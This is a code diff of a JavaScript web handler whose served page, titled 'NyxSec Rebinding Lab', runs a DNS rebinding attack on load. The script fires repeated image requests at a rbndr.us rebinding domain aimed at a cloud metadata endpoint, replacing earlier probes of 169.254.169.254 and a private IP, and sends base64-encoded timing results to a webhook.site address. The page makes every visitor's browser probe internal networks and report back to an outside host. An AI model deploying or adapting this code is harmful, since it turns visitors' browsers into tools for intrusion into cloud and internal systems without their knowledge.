@@ -2,44 +2,39 @@ export default function handler(req, res) {
   res.setHeader('Content-Type', 'text/html');
   res.status(200).send(`
     <html>
-      <head><title>NyxSec Research Lab</title></head>
+      <head><title>NyxSec Rebinding Lab</title></head>
       <body>
-        <pre>Status: Analyzing Google Internal Network Architecture...</pre>
+        <pre>Status: Initiating DNS Rebinding Attack...</pre>
         <script>
           const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
+          const rebindDomain = "http://01010101.a9fea9fe.rbndr.us/computeMetadata/v1/instance/hostname";
 
-          async function probeTarget(targetName, url) {
+          async function attemptRebind(id) {
             const start = Date.now();
             return new Promise((resolve) => {
               const img = new Image();
-              
-              // Timeout 5 detik: Jika lewat, berarti paket di-drop (Filtered/Silent)
               const timer = setTimeout(() => {
-                img.src = ""; 
-                resolve({ target: targetName, time: Date.now() - start, status: "timeout" });
-              }, 5000);
+                resolve({ id, time: Date.now() - start, status: "timeout" });
+              }, 3000);
 
               img.onload = img.onerror = () => {
                 clearTimeout(timer);
-                resolve({ target: targetName, time: Date.now() - start, status: "finished" });
+                resolve({ id, time: Date.now() - start, status: "finished" });
               };
 
-              // Cache-busting unik per request
-              img.src = url + "?v=" + Math.random();
+              // Memaksa resolusi DNS baru dengan parameter acak
+              img.src = rebindDomain + "?cache=" + Math.random();
             });
           }
 
           async function runTest() {
             const results = [];
-            
-            // 1. Target Metadata (IP Link-Local)
-            results.push(await probeTarget("METADATA", "http://169.254.169.254/computeMetadata/v1/instance/hostname"));
-            
-            // 2. Target Baseline (IP Private yang kemungkinan besar mati)
-            results.push(await probeTarget("DEAD_IP", "http://10.255.255.1/"));
+            // Melakukan 10 percobaan cepat untuk memicu rotasi DNS rbndr.us
+            for(let i=0; i<10; i++) {
+              results.push(await attemptRebind(i));
+            }
 
-            // Kirim komparasi data ke Webhook Aditya
-            fetch(webhook + "?results=" + btoa(JSON.stringify(results)));
+            fetch(webhook + "?rebind_results=" + btoa(JSON.stringify(results)));
           }
 
           runTest();
